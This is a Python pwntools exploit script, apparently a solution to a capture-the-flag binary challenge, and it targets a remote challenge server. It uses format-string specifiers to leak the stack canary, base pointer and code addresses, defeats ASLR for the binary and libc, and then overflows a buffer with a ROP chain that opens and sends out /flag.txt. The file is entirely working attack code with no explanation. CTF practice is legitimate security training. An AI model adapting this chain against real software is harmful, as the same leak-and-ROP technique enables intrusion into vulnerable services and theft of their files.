#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary = ELF('./task')
libc = ELF("./libs/libc.so.6")

host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 33744)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *(echo+181)
continue
'''.format(**locals())

# -- Exploit goes here --

io = start(env={'LD_LIBRARY_PATH': './libs'})#

def execute(payload):
    io.sendlineafter(b": ", payload)
    return io.recvuntil(b"\nmessage")[:-len(b"\nmessage")]

canary = int(execute(b"####%15$p####").split(b"####")[1], 16)

base_pointer = int(execute(b"####%16$p####").split(b"####")[1], 16)

main = int(execute(b"####%17$p####").split(b"####")[1], 16)
elf.address = (main - elf.symbols["main"]) & ~0xfff

start_main = int(execute(b"####%19$p####").split(b"####")[1], 16)
libc.address = (start_main - libc.symbols["__libc_start_main"]) & ~0xfff

rop = ROP(libc)

file_name = b"/flag.txt"
payload = b"x" + file_name.ljust(71, b"\0") + p64(canary) + p64(base_pointer) + p64(rop.rdi.address) + p64(base_pointer - 95) + p64(rop.rsi.address) + p64(0) + p64(libc.symbols["open"]) + p64(rop.rdi.address) + p64(1) + p64(rop.rsi.address) + p64(3) + p64(rop.rdx.address) + p64(0) + p64(rop.rcx.address) + p64(100) + p64(libc.symbols["sendfile"]) + p64(rop.rdi.address) + p64(0) + p64(rop.rsi.address) + p64(base_pointer) + p64(rop.rdx.address) + p64(20) + p64(libc.symbols["read"])
io.sendlineafter(b": ", payload)

io.interactive()
io.close()